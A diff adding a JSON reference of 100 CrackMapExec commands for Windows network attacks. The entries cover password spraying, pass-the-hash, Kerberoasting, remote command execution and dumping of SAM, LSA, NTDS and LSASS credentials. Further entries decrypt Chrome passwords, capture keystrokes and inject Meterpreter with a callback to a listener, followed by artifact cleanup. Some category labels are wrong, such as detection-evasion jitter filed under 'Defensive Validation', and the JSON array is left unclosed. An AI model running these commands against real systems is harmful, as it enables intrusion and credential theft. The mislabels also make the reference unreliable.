@@ -1,0 +1,707 @@
+{
+    "tool": "crackmapexec",
+    "description": "Complete CrackMapExec command and workflow reference from basic to advanced lateral movement and credential testing",
+    "total_commands": 100,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec -h",
+            "example": "crackmapexec -h",
+            "explanation": "Displays the main help menu and available protocol options"
+        },
+        {
+            "id": 2,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec smb -h",
+            "example": "crackmapexec smb -h",
+            "explanation": "Displays specific help and options for the SMB protocol module"
+        },
+        {
+            "id": 3,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec winrm -h",
+            "example": "crackmapexec winrm -h",
+            "explanation": "Displays specific help and options for the WinRM protocol module"
+        },
+        {
+            "id": 4,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec ssh -h",
+            "example": "crackmapexec ssh -h",
+            "explanation": "Displays specific help and options for the SSH protocol module"
+        },
+        {
+            "id": 5,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec ldap -h",
+            "example": "crackmapexec ldap -h",
+            "explanation": "Displays specific help and options for the LDAP protocol module"
+        },
+        {
+            "id": 6,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec mssql -h",
+            "example": "crackmapexec mssql -h",
+            "explanation": "Displays specific help and options for the MSSQL protocol module"
+        },
+        {
+            "id": 7,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec -L",
+            "example": "crackmapexec -L",
+            "explanation": "Lists all available modules that can be loaded"
+        },
+        {
+            "id": 8,
+            "category": "Basic Syntax & Help",
+            "command": "crackmapexec smb --options",
+            "example": "crackmapexec smb --options",
+            "explanation": "Lists available options and their current settings for the SMB protocol"
+        },
+        {
+            "id": 9,
+            "category": "Network Discovery",
+            "command": "crackmapexec smb 192.168.1.0/24",
+            "example": "crackmapexec smb 192.168.1.0/24",
+            "explanation": "Performs unauthenticated discovery of SMB hosts across a network range"
+        },
+        {
+            "id": 10,
+            "category": "Authentication Testing",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jdoe' -p 'Password123!'",
+            "explanation": "Tests SMB login with a single cleartext username and password"
+        },
+        {
+            "id": 11,
+            "category": "Authentication Testing",
+            "command": "crackmapexec smb 192.168.1.10 -u 'users.txt' -p 'passwords.txt'",
+            "example": "crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt",
+            "explanation": "Performs a credential spray using lists of usernames and passwords"
+        },
+        {
+            "id": 12,
+            "category": "Authentication Testing",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-auth",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'admin' --local-auth",
+            "explanation": "Authenticates against the local SAM database instead of the domain controller"
+        },
+        {
+            "id": 13,
+            "category": "Authentication Testing",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p ''",
+            "example": "crackmapexec smb 192.168.1.10 -u 'guest' -p ''",
+            "explanation": "Tests for null session or empty password access on the target"
+        },
+        {
+            "id": 14,
+            "category": "Authentication Testing",
+            "command": "crackmapexec smb 192.168.1.10 -u '' -p ''",
+            "example": "crackmapexec smb 192.168.1.10 -u '' -p ''",
+            "explanation": "Checks for anonymous authentication access to the target"
+        },
+        {
+            "id": 15,
+            "category": "Pass-the-Hash",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -H 'NTLM_HASH'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'",
+            "explanation": "Authenticates using an NTLM hash instead of a cleartext password"
+        },
+        {
+            "id": 16,
+            "category": "Pass-the-Hash",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -H 'NT_HASH'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -H '31d6cfe0d16ae931b73c59d7e0c089c0'",
+            "explanation": "Authenticates using only the NT portion of the hash"
+        },
+        {
+            "id": 17,
+            "category": "Kerberos Authentication",
+            "command": "crackmapexec smb 192.168.1.10 -k",
+            "example": "crackmapexec smb 192.168.1.10 -k",
+            "explanation": "Authenticates using an existing Kerberos ticket from the KRB5CCNAME environment variable"
+        },
+        {
+            "id": 18,
+            "category": "Kerberos Authentication",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -k",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jdoe' -p 'Password123' -k",
+            "explanation": "Attempts to request a TGT and authenticate via Kerberos with supplied credentials"
+        },
+        {
+            "id": 19,
+            "category": "Kerberos Authentication",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -H 'NTLM_HASH' -k",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jdoe' -H '31d6cfe0d16ae931b73c59d7e0c089c0' -k",
+            "explanation": "Requests a TGT using the RC4 key (NT hash) and authenticates via Kerberos"
+        },
+        {
+            "id": 20,
+            "category": "Kerberos Authentication",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --aesKey 'AES_KEY' -k",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jdoe' -p 'pass' --aesKey 'AES256_KEY' -k",
+            "explanation": "Authenticates via Kerberos using a specific AES256 key"
+        },
+        {
+            "id": 21,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --shares",
+            "example": "crackmapexec smb 192.168.1.10 -u 'guest' -p '' --shares",
+            "explanation": "Lists available SMB shares and the user's access level (READ/WRITE)"
+        },
+        {
+            "id": 22,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sessions",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --sessions",
+            "explanation": "Enumerates active SMB sessions on the target host"
+        },
+        {
+            "id": 23,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --disks",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --disks",
+            "explanation": "Lists the physical disks and logic drives mounted on the target"
+        },
+        {
+            "id": 24,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --loggedon-users",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --loggedon-users",
+            "explanation": "Enumerates users currently logged on to the target system"
+        },
+        {
+            "id": 25,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --users",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --users",
+            "explanation": "Enumerates all domain users via the target's SAM or LSA"
+        },
+        {
+            "id": 26,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --groups",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --groups",
+            "explanation": "Enumerates all domain groups available on the target"
+        },
+        {
+            "id": 27,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-groups",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --local-groups",
+            "explanation": "Enumerates local groups defined specifically on the target machine"
+        },
+        {
+            "id": 28,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --pass-pol",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --pass-pol",
+            "explanation": "Retrieves the domain password policy (complexity, lockout, history)"
+        },
+        {
+            "id": 29,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rid-brute 1000",
+            "example": "crackmapexec smb 192.168.1.10 -u 'guest' -p '' --rid-brute 2000",
+            "explanation": "Brute forces RIDs to map users and groups when standard enumeration fails"
+        },
+        {
+            "id": 30,
+            "category": "Spidering",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --spider 'C$'",
+            "explanation": "Spiders the C$ share listing all readable files and directories"
+        },
+        {
+            "id": 31,
+            "category": "Spidering",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$' --regex 'pass'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --spider 'C$' --regex 'password'",
+            "explanation": "Spiders the share looking only for filenames matching a regex pattern"
+        },
+        {
+            "id": 32,
+            "category": "Spidering",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$' --content",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --spider 'C$' --content",
+            "explanation": "Searches inside file contents (not just filenames) during spidering"
+        },
+        {
+            "id": 33,
+            "category": "Spidering",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M spider_plus",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M spider_plus",
+            "explanation": "Uses the advanced spider_plus module to dump metadata and file listings to JSON"
+        },
+        {
+            "id": 34,
+            "category": "WinRM Usage",
+            "command": "crackmapexec winrm 192.168.1.10 -u 'user' -p 'password'",
+            "example": "crackmapexec winrm 192.168.1.10 -u 'admin' -p 'password'",
+            "explanation": "Checks if WinRM authentication is possible on the target"
+        },
+        {
+            "id": 35,
+            "category": "WinRM Usage",
+            "command": "crackmapexec winrm 192.168.1.10 -u 'user' -p 'password' -x 'whoami'",
+            "example": "crackmapexec winrm 192.168.1.10 -u 'admin' -p 'password' -x 'whoami'",
+            "explanation": "Executes a command via WinRM (often quieter than SMB exec)"
+        },
+        {
+            "id": 36,
+            "category": "WinRM Usage",
+            "command": "crackmapexec winrm 192.168.1.10 -u 'user' -p 'password' -X 'Get-Process'",
+            "example": "crackmapexec winrm 192.168.1.10 -u 'admin' -p 'password' -X 'Get-Process'",
+            "explanation": "Executes a PowerShell command directly via WinRM"
+        },
+        {
+            "id": 37,
+            "category": "MSSQL Usage",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'password'",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password'",
+            "explanation": "Tests authentication against an MSSQL database instance"
+        },
+        {
+            "id": 38,
+            "category": "MSSQL Usage",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' --local-auth",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password' --local-auth",
+            "explanation": "Authenticates to MSSQL using a local database account"
+        },
+        {
+            "id": 39,
+            "category": "MSSQL Usage",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' -q 'SELECT @@VERSION'",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password' -q 'SELECT @@VERSION'",
+            "explanation": "Executes a SQL query against the target database"
+        },
+        {
+            "id": 40,
+            "category": "MSSQL Usage",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' -x 'whoami'",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password' -x 'whoami'",
+            "explanation": "Attempts to execute system commands via xp_cmdshell on MSSQL"
+        },
+        {
+            "id": 41,
+            "category": "LDAP Usage",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'password'",
+            "example": "crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password'",
+            "explanation": "Tests LDAP authentication against a Domain Controller"
+        },
+        {
+            "id": 42,
+            "category": "LDAP Usage",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --asreproast output.txt",
+            "example": "crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --asreproast hashes.txt",
+            "explanation": "Checks for AS-REP roasting vulnerabilities and saves hashes to a file"
+        },
+        {
+            "id": 43,
+            "category": "LDAP Usage",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --kerberoasting output.txt",
+            "example": "crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --kerberoasting hashes.txt",
+            "explanation": "Performs Kerberoasting against the domain and saves TGS hashes"
+        },
+        {
+            "id": 44,
+            "category": "LDAP Usage",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --trusted-for-delegation",
+            "example": "crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --trusted-for-delegation",
+            "explanation": "Enumerates accounts trusted for unconstrained delegation"
+        },
+        {
+            "id": 45,
+            "category": "LDAP Usage",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --admin-count",
+            "example": "crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --admin-count",
+            "explanation": "Enumerates high-value users protected by the AdminSDHolder object"
+        },
+        {
+            "id": 46,
+            "category": "Command Execution",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -x 'ipconfig /all'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -x 'ipconfig /all'",
+            "explanation": "Executes a command via cmd.exe on the target system"
+        },
+        {
+            "id": 47,
+            "category": "Command Execution",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -X '$PSVersionTable'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -X '$PSVersionTable'",
+            "explanation": "Executes a command via PowerShell on the target system"
+        },
+        {
+            "id": 48,
+            "category": "Command Execution",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method smbexec -x 'whoami'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method smbexec -x 'whoami'",
+            "explanation": "Forces the execution method to use smbexec (creating a service) explicitly"
+        },
+        {
+            "id": 49,
+            "category": "Command Execution",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method wmiexec -x 'whoami'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method wmiexec -x 'whoami'",
+            "explanation": "Forces the execution method to use wmiexec (DCOM)"
+        },
+        {
+            "id": 50,
+            "category": "Command Execution",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method atexec -x 'whoami'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method atexec -x 'whoami'",
+            "explanation": "Forces the execution method to use the Task Scheduler (atexec)"
+        },
+        {
+            "id": 51,
+            "category": "Command Execution",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method mmcexec -x 'whoami'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method mmcexec -x 'whoami'",
+            "explanation": "Forces the execution method to use MMC (Microsoft Management Console)"
+        },
+        {
+            "id": 52,
+            "category": "File Operations",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --put local_file remote_path",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --put tool.exe C:\\Windows\\Temp\\tool.exe",
+            "explanation": "Uploads a file from the attacker machine to the target system"
+        },
+        {
+            "id": 53,
+            "category": "File Operations",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --get remote_path local_file",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --get C:\\Windows\\System32\\drivers\\etc\\hosts ./hosts",
+            "explanation": "Downloads a file from the target system to the attacker machine"
+        },
+        {
+            "id": 54,
+            "category": "Credential Harvesting",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sam",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --sam",
+            "explanation": "Dumps the SAM database to retrieve local account hashes (requires Admin)"
+        },
+        {
+            "id": 55,
+            "category": "Credential Harvesting",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --lsa",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --lsa",
+            "explanation": "Dumps LSA secrets from the registry (requires Admin)"
+        },
+        {
+            "id": 56,
+            "category": "Credential Harvesting",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --ntds",
+            "explanation": "Attempts to parse the NTDS.dit file on a Domain Controller using Volume Shadow Copy"
+        },
+        {
+            "id": 57,
+            "category": "Credential Harvesting",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds vss",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --ntds vss",
+            "explanation": "Explicitly uses VSS method to dump NTDS.dit"
+        },
+        {
+            "id": 58,
+            "category": "Credential Harvesting",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds drsuapi",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --ntds drsuapi",
+            "explanation": "Uses the DRSUAPI replication protocol to dump domain hashes (DCSync)"
+        },
+        {
+            "id": 59,
+            "category": "Modules - Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M enum_av",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M enum_av",
+            "explanation": "Uses a module to identify installed antivirus software on the target"
+        },
+        {
+            "id": 60,
+            "category": "Modules - Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M wdigest -o ACTION=enable",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M wdigest -o ACTION=enable",
+            "explanation": "Modifies registry settings to enable WDigest credential caching (requires reboot to take effect)"
+        },
+        {
+            "id": 61,
+            "category": "Modules - Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M uac",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M uac",
+            "explanation": "Checks UAC (User Account Control) configuration and status"
+        },
+        {
+            "id": 62,
+            "category": "Modules - Credential Dumping",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M lsassy",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M lsassy",
+            "explanation": "Uses the lsassy module to remotely dump LSASS memory and extract credentials"
+        },
+        {
+            "id": 63,
+            "category": "Modules - Credential Dumping",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M nanodump",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M nanodump",
+            "explanation": "Uses the nanodump module to create a minidump of LSASS with minimal footprint"
+        },
+        {
+            "id": 64,
+            "category": "Modules - Credential Dumping",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M mimikatz",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M mimikatz",
+            "explanation": "Executes Mimikatz commands directly on the target (less opsec safe)"
+        },
+        {
+            "id": 65,
+            "category": "Modules - Credential Dumping",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'",
+            "explanation": "Runs a specific Mimikatz command via the module"
+        },
+        {
+            "id": 66,
+            "category": "Modules - Vulnerability Scanning",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M zerologon",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M zerologon",
+            "explanation": "Checks if the target Domain Controller is vulnerable to ZeroLogon (CVE-2020-1472)"
+        },
+        {
+            "id": 67,
+            "category": "Modules - Vulnerability Scanning",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M petitpotam",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M petitpotam",
+            "explanation": "Checks if the target is vulnerable to PetitPotam coercion"
+        },
+        {
+            "id": 68,
+            "category": "Modules - Vulnerability Scanning",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M nopac",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M nopac",
+            "explanation": "Checks for the NoPac vulnerability (CVE-2021-42278/42287)"
+        },
+        {
+            "id": 69,
+            "category": "Modules - Post Exploitation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M rdp -o ACTION=enable",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M rdp -o ACTION=enable",
+            "explanation": "Enables RDP on the target host by modifying registry keys"
+        },
+        {
+            "id": 70,
+            "category": "Modules - Post Exploitation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M webdav",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M webdav",
+            "explanation": "Checks if the WebClient service is running (useful for coercion attacks)"
+        },
+        {
+            "id": 71,
+            "category": "Modules - Post Exploitation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M gpp_password",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M gpp_password",
+            "explanation": "Searches SYSVOL for Group Policy Preferences XML files containing decrypted passwords"
+        },
+        {
+            "id": 72,
+            "category": "RDP Protocol",
+            "command": "crackmapexec rdp 192.168.1.10 -u 'user' -p 'password'",
+            "example": "crackmapexec rdp 192.168.1.10 -u 'admin' -p 'password'",
+            "explanation": "Tests valid credentials against the RDP service"
+        },
+        {
+            "id": 73,
+            "category": "RDP Protocol",
+            "command": "crackmapexec rdp 192.168.1.10 -u 'user' -p 'password' --screenshot",
+            "example": "crackmapexec rdp 192.168.1.10 -u 'admin' -p 'password' --screenshot",
+            "explanation": "Takes a screenshot of the RDP login session if authentication succeeds"
+        },
+        {
+            "id": 74,
+            "category": "Database Maintenance",
+            "command": "crackmapexec smb 192.168.1.0/24 --export targets.csv",
+            "example": "crackmapexec smb 192.168.1.0/24 --export targets.csv",
+            "explanation": "Exports the internal CME database of discovered hosts to a CSV file"
+        },
+        {
+            "id": 75,
+            "category": "Database Maintenance",
+            "command": "cme-db",
+            "example": "cme-db",
+            "explanation": "Launches the database viewer to manage workspaces and credentials manually"
+        },
+        {
+            "id": 76,
+            "category": "Advanced Workflow",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --continue-on-success",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'admin' -p 'pass' --continue-on-success",
+            "explanation": "Continues testing credentials against other hosts even after a success"
+        },
+        {
+            "id": 77,
+            "category": "Advanced Workflow",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --no-output",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' --no-output",
+            "explanation": "Suppresses output to stdout (useful for automated scripts)"
+        },
+        {
+            "id": 78,
+            "category": "Advanced Workflow",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --verbose",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' --verbose",
+            "explanation": "Enables verbose logging to see detailed protocol interaction and errors"
+        },
+        {
+            "id": 79,
+            "category": "Advanced Workflow",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --gpo-list",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' --gpo-list",
+            "explanation": "Lists Group Policy Objects applied to the machine"
+        },
+        {
+            "id": 80,
+            "category": "Advanced Workflow",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M get_keystrokes",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M get_keystrokes",
+            "explanation": "Attempts to capture keystrokes from the target user session"
+        },
+        {
+            "id": 81,
+            "category": "SSH Protocol",
+            "command": "crackmapexec ssh 192.168.1.10 -u 'user' -p 'password'",
+            "example": "crackmapexec ssh 192.168.1.10 -u 'root' -p 'password'",
+            "explanation": "Tests SSH authentication"
+        },
+        {
+            "id": 82,
+            "category": "SSH Protocol",
+            "command": "crackmapexec ssh 192.168.1.10 -u 'user' --key-file id_rsa",
+            "example": "crackmapexec ssh 192.168.1.10 -u 'root' --key-file ~/.ssh/id_rsa",
+            "explanation": "Authenticates to SSH using a private key file"
+        },
+        {
+            "id": 83,
+            "category": "FTP Protocol",
+            "command": "crackmapexec ftp 192.168.1.10 -u 'user' -p 'password'",
+            "example": "crackmapexec ftp 192.168.1.10 -u 'ftpuser' -p 'password'",
+            "explanation": "Tests authentication against an FTP server"
+        },
+        {
+            "id": 84,
+            "category": "FTP Protocol",
+            "command": "crackmapexec ftp 192.168.1.10 -u 'user' -p 'password' --ls",
+            "example": "crackmapexec ftp 192.168.1.10 -u 'ftpuser' -p 'password' --ls",
+            "explanation": "Lists files in the FTP root directory after authentication"
+        },
+        {
+            "id": 85,
+            "category": "BloodHound Integration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --bloodhound",
+            "example": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --bloodhound",
+            "explanation": "Runs the BloodHound ingestor via LDAP to collect domain relationships"
+        },
+        {
+            "id": 86,
+            "category": "BloodHound Integration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --bloodhound -c All",
+            "example": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --bloodhound -c All",
+            "explanation": "Collects all BloodHound data points (Sessions, LocalAdmins, etc)"
+        },
+        {
+            "id": 87,
+            "category": "Password Policy",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --force-ps32",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --force-ps32",
+            "explanation": "Forces PowerShell execution to use the 32-bit process"
+        },
+        {
+            "id": 88,
+            "category": "Defensive Validation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --jitter 5",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --jitter 5",
+            "explanation": "Adds a random delay (jitter) between actions to evade simple timing detection"
+        },
+        {
+            "id": 89,
+            "category": "Defensive Validation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sleep 10",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --sleep 10",
+            "explanation": "Sleeps for a specific duration between hosts in a range scan"
+        },
+        {
+            "id": 90,
+            "category": "Lateral Movement",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M met_inject -o LHOST=192.168.1.5 LPORT=4444",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M met_inject -o LHOST=192.168.1.5 LPORT=4444",
+            "explanation": "Injects a Meterpreter payload into memory (requires Listener)"
+        },
+        {
+            "id": 91,
+            "category": "Lateral Movement",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M slinky",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M slinky",
+            "explanation": "Creates LNK files on shares to harvest NTLMv2 hashes from users who browse them"
+        },
+        {
+            "id": 92,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --check-uac",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --check-uac",
+            "explanation": "Explicitly checks if UAC limits the administrative token"
+        },
+        {
+            "id": 93,
+            "category": "Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --interface",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --interface",
+            "explanation": "Lists network interfaces on the remote host"
+        },
+        {
+            "id": 94,
+            "category": "Module - Teams",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M teams_localdb",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M teams_localdb",
+            "explanation": "Parses local Microsoft Teams database for cookies and tokens"
+        },
+        {
+            "id": 95,
+            "category": "Module - Chrome",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M chrome",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M chrome",
+            "explanation": "Decrypts Chrome passwords and cookies (requires user session)"
+        },
+        {
+            "id": 96,
+            "category": "Module - Wifi",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M wifi",
+            "example": "crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M wifi",
+            "explanation": "Extracts saved Wi-Fi profiles and cleartext keys"
+        },
+        {
+            "id": 97,
+            "category": "Cleanup",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rm local_file",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --rm C:\\Windows\\Temp\\tool.exe",
+            "explanation": "Deletes a specific file from the remote target"
+        },
+        {
+            "id": 98,
+            "category": "Cleanup",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -x 'taskkill /IM process.exe /F'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -x 'taskkill /IM agent.exe /F'",
+            "explanation": "Forcefully kills a running process to clean up execution artifacts"
+        },
+        {
+            "id": 99,
+            "category": "Automation",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --continue-on-success --log cme.log",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'admin' -p 'pass' --continue-on-success --log cme.log",
+            "explanation": "Runs a sweep and logs all output to a file for later analysis"
+        },
+        {
+            "id": 100,
+            "category": "Final",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-auth --sam --lsa --ntds",
+            "example": "crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --local-auth --sam --lsa --ntds",
+            "explanation": "Combines multiple dumping flags in a single execution for efficiency"
+        }
